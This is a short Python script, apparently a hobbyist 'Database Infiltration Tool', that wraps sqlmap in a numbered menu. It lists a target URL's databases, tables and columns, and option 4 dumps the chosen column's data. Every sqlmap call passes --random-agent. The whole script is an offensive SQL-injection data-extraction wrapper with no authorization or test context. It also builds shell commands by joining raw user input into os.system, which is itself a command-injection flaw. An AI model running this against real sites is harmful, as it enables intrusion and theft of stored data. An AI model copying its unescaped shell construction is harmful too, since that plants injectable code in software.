#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet DATABASE INFILTRATION")

print("""

Welcome Database Infiltration Tool

1) Open Link
2) Open Link and Database Name
3) Open Link, Database Name and Table Name
4) Open Link, Database Name, Table Name and Colon Name

""")

process_number = input("Process Number Enter : ")

if process_number == "1":
	link = input("Open Link Enter : ")
	os.system("sqlmap -u " + link + " --dbs --random-agent")
	
elif process_number == "2":
	link = input("Open Link Enter : ")
	database = input("Database Name Enter : ")
	os.system("sqlmap -u " + link + " -D " + database + " --tables --random-agent")
	
elif process_number == "3":
	link = input("Open Link Enter : ")
	database = input("Database Name Enter : ")
	table = input("Table Name Enter : ")
	os.system("sqlmap -u " + link + " -D " + database + " -T " + table + " --columns --random-agent")
	
elif process_number == "4":
	link = input("Open Link Enter : ")
	database = input("Database Name Enter : ")
	table = input("Table Name Enter : ")
	colon = input("Colon Name Enter : ")
	os.system("sqlmap -u " + link + " -D " + database + " -T " + table + " -C " + colon + " --dump --random-agent")
	
else:
	print("Wron Choice")
